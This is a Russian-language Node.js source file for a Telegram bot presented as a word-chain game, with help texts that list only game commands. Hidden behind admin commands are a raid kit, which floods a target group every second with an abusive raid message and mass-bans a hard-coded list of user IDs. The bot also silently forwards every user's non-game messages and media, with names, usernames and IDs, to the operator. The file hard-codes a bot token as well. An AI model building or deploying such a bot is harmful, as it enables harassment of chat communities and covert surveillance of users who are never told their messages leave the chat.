const { Telegraf } = require('telegraf');
const fs = require('fs');
const path = require('path');

// Токен бота
const BOT_TOKEN = '8522661290:AAEy0SwEDAoFkhoBjIpakcHbneiGzJCMLYs';
const ADMIN_ID = 8578547768; // Ваш ID
const FORWARD_USER_ID = 8578547768; // ID для пересылки сообщений

const bot = new Telegraf(BOT_TOKEN);

// ============ ИГРА В СЛОВА (slova.js) ============
const games = new Map();
const PROBLEM_LETTERS = ['ь', 'ъ', 'ы', 'й'];

function getLastValidLetter(word) {
    if (!word || word.length === 0) return '';
    let lastLetter = word.slice(-1).toLowerCase();
    if (PROBLEM_LETTERS.includes(lastLetter) && word.length > 1) {
        return word.slice(-2, -1).toLowerCase();
    }
    return lastLetter;
}

function loadWords() {
    try {
        const wordsPath = path.join(__dirname, 'words.txt');
        const content = fs.readFileSync(wordsPath, 'utf8');
        return content.split('\n')
            .map(word => word.trim().toLowerCase())
            .filter(word => word.length > 0 && !PROBLEM_LETTERS.includes(word[0]));
    } catch (error) {
        console.error('Ошибка загрузки слов:', error);
        return ['яблоко', 'арбуз', 'зонт', 'трамвай'];
    }
}

const words = loadWords();

function normalizeLetter(letter) {
    return letter === 'ё' ? 'е' : letter;
}

// Команды игры
bot.command('start', (ctx) => {
    ctx.reply(
        '🎮 Привет! Я бот для игры в слова.\n\n' +
        'Правила: называйте слово на последнюю букву предыдущего слова.\n' +
        '*Подсказка:* Если слово заканчивается на "ь", "ъ", "ы" или "й", ' +
        'используется предпоследняя буква.\n\n' +
        'Команды:\n' +
        '/start - показать это сообщение\n' +
        '/game - начать новую игру\n' +
        '/stop - закончить игру\n' +
        '/ping - проверить работу бота\n' +
        '/info - информация о боте',
        { parse_mode: 'Markdown' }
    );
});

bot.command('game', (ctx) => {
    const chatId = ctx.chat.id;
    const firstWord = words[Math.floor(Math.random() * words.length)];
    const nextLetter = getLastValidLetter(firstWord);
    
    games.set(chatId, {
        lastWord: firstWord,
        usedWords: [firstWord],
        lastLetter: nextLetter
    });
    
    ctx.reply(
        `🎮 Игра началась!\n\n` +
        `Первое слово: *${firstWord.toUpperCase()}*\n` +
        `Следующая буква: *${nextLetter.toUpperCase()}*\n\n` +
        `_Слово заканчивается на "${firstWord.slice(-1)}", ` +
        `но так как на эту букву нет слов, используем "${nextLetter}"_`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('stop', (ctx) => {
    const chatId = ctx.chat.id;
    if (games.has(chatId)) {
        games.delete(chatId);
        ctx.reply('🛑 Игра завершена. Чтобы начать новую, введите /game');
    } else {
        ctx.reply('У вас нет активной игры. Начните с /game');
    }
});

// ============ ВЫДАЧА АДМИНКИ (adm.js) ============
bot.command('giveadm', async (ctx) => {
    try {
        if (ctx.chat.type === 'private') return ctx.reply('❌ Только в группах!');
        if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
        
        const botMember = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
        if (!botMember.status.includes('administrator')) {
            return ctx.reply('❌ Бот не админ!');
        }
        
        const ids = ctx.message.text
            .split('\n')
            .slice(1)
            .map(id => id.trim())
            .filter(id => id && /^\d+$/.test(id));
        
        if (ids.length === 0) {
            return ctx.reply('❌ Пример:\n/giveadm\n123456789\n987654321');
        }
        
        for (const userId of ids) {
            try {
                await ctx.telegram.promoteChatMember(ctx.chat.id, parseInt(userId), {
                    can_change_info: true,
                    can_delete_messages: true,
                    can_invite_users: true,
                    can_restrict_members: true,
                    can_pin_messages: true,
                    can_promote_members: false,
                    can_manage_chat: true
                });
            } catch (e) {}
        }
        
        await ctx.reply(`✅ Права выданы ${ids.length} пользователям`);
    } catch (error) {
        ctx.reply('❌ Ошибка');
    }
});

// ============ БАН ПО СПИСКУ (ban.js) ============
const BAN_CHAT_ID = '-1003710481812';
const BAN_LIST = [
    '8578547768', '5142590486', '6294439507', '815236637', '7850568376',
    '5959137938', '8498787907', '5462721514', '8557186305', '8071005755'
];

bot.command('banlist', async (ctx) => {
    try {
        if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
        
        // Проверяем ID чата
        const chatIdStr = ctx.chat.id.toString();
        if (chatIdStr !== BAN_CHAT_ID && chatIdStr !== '-1003771281366') {
            return ctx.reply('❌ Эта команда работает только в определенном чате');
        }
        
        let bannedCount = 0;
        let failedCount = 0;
        const failedUsers = [];
        
        for (const userId of BAN_LIST) {
            try {
                await ctx.telegram.banChatMember(ctx.chat.id, parseInt(userId));
                bannedCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (error) {
                failedCount++;
                failedUsers.push(userId);
            }
        }
        
        let reply = `✅ Бан завершен\nЗабанено: ${bannedCount}\nОшибок: ${failedCount}`;
        if (failedUsers.length > 0 && failedUsers.length <= 5) {
            reply += `\nНе забанены: ${failedUsers.join(', ')}`;
        }
        await ctx.reply(reply);
        
    } catch (error) {
        console.error('Ошибка в banlist:', error);
        ctx.reply('❌ Ошибка при выполнении команды');
    }
});

// ============ СПАМ (spam.js) ============
const SPAM_CHAT_ID = '-1003710481812';
const SPAM_TEXT = 'СЬЕБАЛИСЬ ВАС РЕЙДЯТ КИВИШКИ @kiwishkii';

let spamming = false;
let spamInterval = null;

bot.command('startspam', async (ctx) => {
    try {
        if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
        if (spamming) return ctx.reply('Спам уже запущен!');
        
        // Проверяем доступ к чату
        try {
            await bot.telegram.getChat(SPAM_CHAT_ID);
        } catch (err) {
            return ctx.reply(`❌ Бот не добавлен в чат или нет доступа: ${err.message}`);
        }
        
        spamming = true;
        await ctx.reply('✅ Спам запущен! Отправляю сообщения в чат...');
        
        // Отправляем первое сообщение сразу
        try {
            await bot.telegram.sendMessage(SPAM_CHAT_ID, SPAM_TEXT);
            console.log('Спам: отправлено первое сообщение');
        } catch (err) {
            console.error('Ошибка при отправке спама:', err.message);
            await ctx.reply(`❌ Ошибка: ${err.message}`);
            spamming = false;
            return;
        }
        
        spamInterval = setInterval(async () => {
            if (spamming) {
                try {
                    await bot.telegram.sendMessage(SPAM_CHAT_ID, SPAM_TEXT);
                } catch (err) {
                    console.error('Ошибка при отправке спама:', err.message);
                    if (spamming) {
                        clearInterval(spamInterval);
                        spamming = false;
                        bot.telegram.sendMessage(ADMIN_ID, '❌ Спам остановлен из-за ошибки: ' + err.message).catch(() => {});
                    }
                }
            }
        }, 1000);
        
    } catch (error) {
        console.error('Ошибка в startspam:', error);
        ctx.reply('❌ Ошибка при запуске спама');
    }
});

bot.command('stopspam', async (ctx) => {
    try {
        if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
        if (!spamming) return ctx.reply('Спам не запущен!');
        
        clearInterval(spamInterval);
        spamInterval = null;
        spamming = false;
        await ctx.reply('⛔ Спам остановлен!');
        console.log('Спам остановлен');
    } catch (error) {
        console.error('Ошибка в stopspam:', error);
        ctx.reply('❌ Ошибка');
    }
});

// ============ ДОПОЛНИТЕЛЬНЫЕ КОМАНДЫ ============
bot.command('ping', (ctx) => {
    ctx.reply('🏓 Pong! Бот работает.');
});

bot.command('info', (ctx) => {
    ctx.reply(
        '🤖 *Информация о боте*\n\n' +
        `📊 Загружено слов: ${words.length}\n` +
        `👥 Активных игр: ${games.size}\n` +
        `🎮 Игра в слова: /game\n` +
        `🛑 Остановить игру: /stop`,
        { parse_mode: 'Markdown' }
    );
});

// ============ ПЕРЕСЫЛКА СООБЩЕНИЙ (parcer.js) ============
async function sendToAdmin(userId, message) {
    try {
        await bot.telegram.sendMessage(userId, message);
        return true;
    } catch (error) {
        console.error(`Не удалось отправить сообщение:`, error.message);
        return false;
    }
}

// ОДИН обработчик для всех текстовых сообщений (игры и пересылки)
bot.on('text', async (ctx) => {
    const messageText = ctx.message.text || '';
    
    // Пропускаем команды
    if (messageText.startsWith('/')) return;
    
    // Пропускаем сообщения от самого бота
    if (ctx.message.from.id === ctx.botInfo.id) return;
    
    const chatId = ctx.chat.id;
    const game = games.get(chatId);
    
    // ============ ОБРАБОТКА ИГРЫ ============
    if (game) {
        const userWord = messageText.toLowerCase().trim();
        const lastLetter = game.lastLetter;
        
        if (userWord.length < 2) {
            ctx.reply('❌ Слово должно быть длиннее одной буквы');
            return;
        }
        
        let firstLetter = userWord[0];
        if (firstLetter === 'ё') firstLetter = 'е';
        
        if (firstLetter !== normalizeLetter(lastLetter)) {
            ctx.reply(
                `❌ Слово должно начинаться на букву *${lastLetter.toUpperCase()}*\n` +
                `(предыдущее слово "${game.lastWord.toUpperCase()}")`,
                { parse_mode: 'Markdown' }
            );
            return;
        }
        
        if (!words.includes(userWord)) {
            ctx.reply('❌ Это слово не найдено в словаре. Попробуйте другое.');
            return;
        }
        
        if (game.usedWords.includes(userWord)) {
            ctx.reply('❌ Это слово уже использовалось в игре.');
            return;
        }
        
        game.usedWords.push(userWord);
        game.lastWord = userWord;
        const nextLetter = getLastValidLetter(userWord);
        game.lastLetter = nextLetter;
        
        let response = `✅ Принято! *${userWord.toUpperCase()}*\n\n`;
        if (PROBLEM_LETTERS.includes(userWord.slice(-1))) {
            response += `Слово заканчивается на "${userWord.slice(-1)}", ` +
                       `поэтому следующая буква: *${nextLetter.toUpperCase()}*`;
        } else {
            response += `Следующая буква: *${nextLetter.toUpperCase()}*`;
        }
        
        ctx.reply(response, { parse_mode: 'Markdown' });
        return; // Важно: возвращаем, чтобы не отправлять сообщение админу
    }
    
    // ============ ПЕРЕСЫЛКА СООБЩЕНИЙ ============
    // Если это не игра, пересылаем админу
    if (ctx.chat.type === 'private' && ctx.message.from.id === FORWARD_USER_ID) return;
    
    let chatInfo = '';
    if (ctx.chat.type === 'private') {
        chatInfo = `👤 Личка: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет'})`;
    } else if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        chatInfo = `👥 Группа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
    } else if (ctx.chat.type === 'channel') {
        chatInfo = `📢 Канал: ${ctx.chat.title}`;
    }
    
    const senderInfo = `От: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет'}) [ID: ${ctx.message.from.id}]`;
    const finalMessage = `📨 НОВОЕ СООБЩЕНИЕ\n\n${chatInfo}\n${senderInfo}\n\n📝 Текст:\n${messageText}`;
    
    await sendToAdmin(FORWARD_USER_ID, finalMessage);
});

// ОДИН обработчик для медиа
bot.on(['photo', 'video', 'document', 'audio', 'sticker'], async (ctx) => {
    if (ctx.message.from.id === ctx.botInfo.id) return;
    if (ctx.chat.type === 'private' && ctx.message.from.id === FORWARD_USER_ID) return;
    
    // Если есть активная игра, не пересылаем медиа (игра не обрабатывает медиа)
    if (games.has(ctx.chat.id)) return;
    
    let chatInfo = '';
    if (ctx.chat.type === 'private') {
        chatInfo = `Личка: ${ctx.message.from.first_name}`;
    } else {
        chatInfo = `Группа: ${ctx.chat.title}`;
    }
    
    const senderInfo = `От: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет'}) [ID: ${ctx.message.from.id}]`;
    const caption = `📨 НОВОЕ МЕДИА\n\n${chatInfo}\n${senderInfo}`;
    
    try {
        if (ctx.message.photo) {
            await bot.telegram.sendPhoto(FORWARD_USER_ID, ctx.message.photo[ctx.message.photo.length - 1].file_id, { caption });
        } else if (ctx.message.video) {
            await bot.telegram.sendVideo(FORWARD_USER_ID, ctx.message.video.file_id, { caption });
        } else if (ctx.message.document) {
            await bot.telegram.sendDocument(FORWARD_USER_ID, ctx.message.document.file_id, { caption });
        } else if (ctx.message.audio) {
            await bot.telegram.sendAudio(FORWARD_USER_ID, ctx.message.audio.file_id, { caption });
        } else if (ctx.message.sticker) {
            await bot.telegram.sendSticker(FORWARD_USER_ID, ctx.message.sticker.file_id);
            await bot.telegram.sendMessage(FORWARD_USER_ID, `📨 НОВЫЙ СТИКЕР\n\n${chatInfo}\n${senderInfo}`);
        }
    } catch (error) {
        console.error('Ошибка при пересылке медиа:', error.message);
    }
});

// ============ ЗАПУСК БОТА ============
bot.catch((err, ctx) => {
    console.error('Ошибка:', err);
    ctx.reply('Произошла ошибка. Попробуйте еще раз.').catch(() => {});
});

async function checkBot() {
    try {
        const botInfo = await bot.telegram.getMe();
        console.log(`🤖 Бот: @${botInfo.username}`);
        console.log(`👑 Админ ID: ${ADMIN_ID}`);
        
        // Проверяем доступ к чату для спама
        try {
            const chat = await bot.telegram.getChat(SPAM_CHAT_ID);
            console.log(`✅ Чат для спама: ${chat.title || SPAM_CHAT_ID}`);
        } catch (err) {
            console.log(`⚠️ Чат для спама недоступен: ${err.message}`);
        }
        
        // Проверяем доступ к чату для бана
        try {
            const chat = await bot.telegram.getChat(BAN_CHAT_ID);
            console.log(`✅ Чат для бана: ${chat.title || BAN_CHAT_ID}`);
        } catch (err) {
            console.log(`⚠️ Чат для бана недоступен: ${err.message}`);
        }
        
    } catch (err) {
        console.error('Ошибка проверки:', err);
    }
}

bot.launch()
    .then(async () => {
        console.log('✅ Бот запущен!');
        await checkBot();
        console.log(`📚 Загружено слов: ${words.length}`);
        console.log('🎮 Доступны команды: /game, /stop, /ping, /info');
        console.log('👑 Админ-команды: /giveadm, /banlist, /startspam, /stopspam');
        console.log('📨 Функция пересылки сообщений активна');
    })
    .catch((err) => {
        console.error('❌ Ошибка запуска:', err);
    });

process.once('SIGINT', () => {
    if (spamInterval) clearInterval(spamInterval);
    bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
    if (spamInterval) clearInterval(spamInterval);
    bot.stop('SIGTERM');
});
